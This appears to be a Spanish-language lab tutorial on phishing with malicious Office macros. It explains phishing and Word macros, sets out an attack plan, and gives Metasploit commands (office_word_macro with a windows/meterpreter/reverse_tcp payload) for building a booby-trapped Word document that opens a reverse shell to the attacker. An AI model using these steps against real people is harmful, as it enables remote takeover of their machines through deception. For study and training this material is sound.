# Objetivos de aprendizaje

- Entender como funciona un ataque de phising
- Descubrir como los macros del documentos puedes usarse y abusar
- Aprender como realizar un ataque de phishing con una macro

# Phishing

Como todos sabemos en el término de seguridad los humanos somos el eslabón más débil, ¿Qué es más fácil buscar una vulnerabilidad en un sistema detras de un firewall o convender a alguien de abrir un documento "importante"?

Phishing es como la palabra pescar, sin embargo, el atacante no se come luego el pesado jiji, bueno, Phishing funciona mandando un "bait" normalmente a un grupo de usuarios. El atacante crea mensajes dependiendo de la urgencia, del target para que tomen medidas inmediatas, incrementando los chances. El proposito realmente es robar información personal o instalar un malware, normalmente se convence a la víctima a utilizar un formulario, abrir un archivo  o clickar en un link

# Macros

Una macro se refiere una instrucción programada diseñada para automatizar tareas repetitivas. Office, te ayudan a crear macros en el documento. En muchos casos, estos macros son características que pueden quitar mucho tiempo. Sin embargo en ciber seguridad estos programas pueden llevar dentro propositos maliciosos.

Para añadir una macro dentro de un documento de Word, nos iremos a menu de ver seleccionaremos Macros y se nos abrira, especificaremos el archivo en cuestión y crearemos

![image](https://github.com/user-attachments/assets/427c5c19-bef5-4730-a38c-fecb78620d05)

Vamos a explorar como un atacante crea un documento y lo utiliza para ganar acecso a un sistema

# Plan de ataque

En este plan necesitamos crear un documento malicioso. Al abrir el documento, la macro se ejecute el payload conectado en la máquina y no se un control remoto. Posteirormente, necesitaremos estar escuchando las conexiones de dicha maquina antes de mandar dicho documento. Para ejecutar el macro utilizaremos una rev shell, utilizada para ejecutar comandos remotamente.

- Crear un documento con la redirección maliciosa
- Estar a la escucha de conexiónes

# Crear un documento malicioso

El primer paso es crear dicho documento en m icaso utilizare metasploit

```
msfconsole

set payload windows/meterpreter/reverse_tcp

use exploit/multi/fileformat/office_word_macro

set LHOST (nuestra ip)

set LPORT (puero en cuestión)

exploit

exit
```

